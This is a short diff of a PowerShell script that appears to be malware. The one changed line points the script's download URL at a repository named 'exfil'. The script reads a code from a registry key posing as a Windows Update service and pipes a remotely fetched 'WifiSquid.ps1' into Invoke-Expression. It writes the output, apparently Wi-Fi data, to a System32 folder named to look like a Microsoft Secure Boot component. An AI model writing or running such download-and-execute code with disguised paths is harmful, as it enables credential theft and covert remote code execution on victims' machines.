@@ -29,7 +29,7 @@ $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $code = (Get-ItemProperty -Path $regPath).Code
-$squidurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/WifiRelated/WifiSquid.ps1"
+$squidurl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/WifiRelated/WifiSquid.ps1"
 $basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
 $finaloutput = Join-Path -Path $basepath -ChildPath "wifi-$code.txt"
 Invoke-RestMethod -Uri $squidurl | Invoke-Expression | Out-file -FilePath $finaloutput
